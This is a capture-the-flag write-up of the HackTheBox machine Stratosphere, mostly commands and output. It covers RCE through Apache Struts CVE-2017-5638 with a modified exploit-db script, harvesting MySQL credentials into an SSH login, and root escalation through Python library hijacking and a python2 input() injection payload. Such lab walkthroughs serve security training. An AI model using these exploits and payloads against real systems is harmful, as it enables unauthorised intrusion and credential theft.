---
title: "Stratosphere"
date: 2021-08-05 16:05:00 +0530
categories: [HackTheBox, Linux Machines]
tags: [linux, tomcat, mysql, python-library-hijack, python-input-injection, hackthebox]
image: /assets/img/Posts/Stratosphere/Stratosphere.png
---
**Stratosphere** is a pretty cool box with an **Apache Struts vulnerability** in which endpoints ending with .action, .go, .do can be injected with a specially crafted Content-Header leading to Remote code execution. The exploit doesn't give us a shell, So I went on with **Dumping MySQL database without an interactive shell** which gives me user's password. For root, We have to exploit a python script which I did in two ways: **Python library hijacking** and exploiting **vulnerable python2 input()** function.

## Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out
Discovered open port 8080/tcp on 10.10.10.64                                   
Discovered open port 80/tcp on 10.10.10.64                                     
Discovered open port 22/tcp on 10.10.10.64                                     
```
Parse those ports to nmap:
```bash
$ ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//;s/\/udp//' | tr '\n' ',' | sed 's/,$//')
$ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out
# Nmap 7.91 scan initiated Tue Aug  3 02:37:52 2021 as: nmap -v -sVC --min-rate 1000 -p 8080,80,22 -oN nmap-fullscan.out 10.10.10.64
Nmap scan report for 10.10.10.64
Host is up (0.20s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings:ff
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Mon, 02 Aug 2021 21:12:32 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Mon, 02 Aug 2021 21:12:31 GMT
|     Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Mon, 02 Aug 2021 21:12:32 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
| http-methods: 
|   Supported Methods: GET HEAD 	POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Stratosphere
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  3 02:38:25 2021 -- 1 IP address (1 host up) scanned in 32.83 seconds
```

# HTTP
I tried fuzzing with `raft-medium` and `dirbuster-medium` wordlist. Dirbuster list gave me an endpoint which wasn't in raft-medium (Dirbuster list has `Monitoring`, seclists has it as `monitoring`.). 

I ended up making a new wordlist having raft-medium at the top and appending the words not in it from  `dirbuster-medium`.
```bash
$ comm -23 sorted-directory-list-2.3-medium.txt sorted-raft-medium-words.txt  > words-not-in-raft-medium
$ cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt words-not-in-seclists-raft-medium > /usr/share/seclists/Discovery/Web-Content/raft-medium-X-directory-list-2.3-medium.txt
```

Directory brute forcing:
```bash
$ ffuf -u http://10.10.10.64/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-X-directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.64/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-X-directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
.                       [Status: 200, Size: 1708, Words: 297, Lines: 64]
                        [Status: 200, Size: 1708, Words: 297, Lines: 64]
Monitoring              [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Visiting any non-existing page gives a 404 and  _"Apache Tomcat/8.5.14 (Debian)"_. 
and it does have some exploits:
```bash
$ searchsploit Apache Tomcat 8.5.14
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypa | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypa | windows/webapps/42953.txt
------------------------------------------------------------------------------- ---------------------------------
```
I tried working with both exploits, none of them worked.(tried that windows one, even if the box is linux one)

# Apache Struts CVE-2017-5638
That Monitoring endpoint also doesn't do anything, login and register forms just say it's in construction.
But thing to notice here is when you use Struts, the framework provides you with a controller servlet, ActionServlet. 

Here's my POST request for the login page:
```
POST /Monitoring/example/Login.action HTTP/1.1
Host: 10.10.10.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://10.10.10.64
Connection: close
Referer: http://10.10.10.64/Monitoring/example/Login_input.action;jsessionid=90C11497ABE9AA524209F6B65F6EED93
Cookie: JSESSIONID=90C11497ABE9AA524209F6B65F6EED93
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

>And even if I google something like _"Apache .action endpoints"_, shows me _"If you find endpoints ending with .action, .do, .go that means that the website is running Struts2 and might be vulnerable. "_
>
![stratosphere-1.png](/assets/img/Posts/Stratosphere/stratosphere-1.png)

[This](https://medium.com/@abhishake21/rce-via-apache-struts2-still-out-there-b15ce205aa21) medium article mentions of an exploit via a specially crafted Content-Header. It also gives an auto-exploit script [here](https://github.com/mazen160/struts-pwn) which mentions **Apache Struts CVE-2017-5638**. I can even use the exploit-db script [here](https://www.exploit-db.com/exploits/41570)

```bash
$ python 41570.py http://10.10.10.64/Monitoring/example/Login_input.action id
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: id

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

But this one doesn't let me have any shell.
I modified the script to give me a look of shell. This is the part that was modified.
```python
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] struts2_S2-045.py <url>")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]
        while True:
            cmd = raw_input("$ ")
            exploit(url, cmd)
```

You can use this command example for the original script:
```bash
$ python 41570.py http://10.10.10.64/Monitoring/example/Login_input.action 'ls -l'
```

I'll work with the modified script:
```bash
root@caretaker# python 41570.py http://10.10.10.64/Monitoring/example/Login_input.action
[*] CVE: 2017-5638 - Apache Struts2 S2-045
$ id
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

$ ls -la
total 24
drwxr-xr-x  5 root    root    4096 Aug  4 05:36 .
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Aug  4 05:36 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8
```

This [script](https://0xdf.gitlab.io/2018/09/01/htb-stratosphere.html#building-a-shell) by Ippsec and 0xdf makes a legit stabilized shell.

# MySQL Database dump

I saw that `db_connect` above, listing the contents:
```bash
$ cat db_connect
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

I tried this password with username `richard` on SSH, I got from passwd file, didn't work.

```bash
$ mysql -ussn_admin -p"AWs64@on*&" -e "show privileges;"
Database
information_schema
ssn
$ mysql -uadmin -padmin -e "show databases;"
Database
information_schema
users
$ mysql -uadmin -padmin -e "use users;show tables;"
Tables_in_users
accounts
$ mysql -uadmin -padmin -e "use users;select * from accounts;"
fullName        password        username
Richard F. Smith        9tc*rhKuG5TyXvUJOrE^5CK7k       richard
```

I can get SSH shell with user `richard`.

# Privesc with python2
If I list sudo permissions on this user:
```bash
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

This is the content of test.py
```python
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
```

## Method-1 Library Hijacking
Since we've write access to the directory where the script is running, I can Hijack the two libraries running on it. Namely: `os` and `hashlib`.

For execution of `os`,  I need to pass that whole md5 comparisons, for something easy I can hijack `hashlib` by making hashlib.py at the same directory as test.py with the contents:
```python
import os
os.system("/bin/sh")
md5(s.fileno(),0)
md5(s.fileno(),1)
md5(s.fileno(),2)
```

This script just imports OS, runs `/bin/sh` with the 3 file-descriptors. Also the file-descriptors are defined in function `md5` as it's being used by test.py as `hashlib.md5()`.

```bash
richard@stratosphere:~$ sudo /usr/bin/python3 /home/richard/test.py
# whoami
root
```

## Method-2 Vulnerable input() in python2
If I look closely on the sudo permissions, there's a wildcard for the python version I can use.
```bash
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

Script intends to be called with python3, both in the shebang line and in the default mapping:
```python
#!/usr/bin/python3
```
and
```bash
richard@stratosphere:~$ ls -l /usr/bin/python
lrwxrwxrwx 1 root root      16 Feb 11 19:46 /usr/bin/python -> /usr/bin/python3
```

Let's see what's different and vulnerable in python2 and not in python3.
In python2, input is equivalent to `eval(raw_input())`, so whatever a user passes is evaluated first.

Here's a quick example:
```python
a=input("Evaluate: ")
print(a)
```

Running with both python2 and python3:
```bash
$ python2 abc.py
Evaluate: 1+1
2

$ python3 abc.py
Evaluate: 1+1
1+1
```

Since, the code doesn't import OS, Subprocess or any other library (just hashlib) before inputs are being called. So without importing the OS module. It will give a NameError saying that name 'os' is not defined.
Well, there is a way around this...
There's a global ``__import__()`` function in python. It accepts a module name and imports it.

Where earlier only passing ``os.system("whoami")``  would've worked, it changes to: 
``__import__("os").system("whoami")``

```bash
richard@stratosphere:~$ sudo  /usr/bin/python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__("os").system("whoami")
root
Traceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 8, in question
    md5.update(q1.encode())
AttributeError: 'int' object has no attribute 'encode'
```
So, even though I see a lot of errors, I don't miss that `root` just after I passed the input.

Let's get that root shell:
```bash
richard@stratosphere:~$ sudo  /usr/bin/python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__("os").system("/bin/bash")
root@stratosphere:/home/richard# id
uid=0(root) gid=0(root) groups=0(root)
```
